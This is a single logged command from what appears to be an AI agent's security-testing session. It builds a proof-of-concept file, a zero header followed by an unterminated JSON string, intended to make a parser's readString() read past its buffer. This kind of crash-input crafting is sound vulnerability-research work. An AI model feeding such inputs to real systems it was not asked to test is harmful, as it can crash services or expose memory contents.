message:
Running command: # Create a PoC: 4 bytes header (zeros) + a JSON string without closing quote
# The string will cause readString() to read past the buffer
python3 -c "
import sys
# 4 bytes header (all zeros = default settings)
# Then a JSON string that starts with '\"' but has no closing quote
# This will cause readString() to read past the buffer looking for '\"'
poc = b'\x00\x00\x00\x00' + b'\"'
sys.stdout.buffer.write(poc)
" > /workspace/poc1.bin
xxd /workspace/poc1.bin
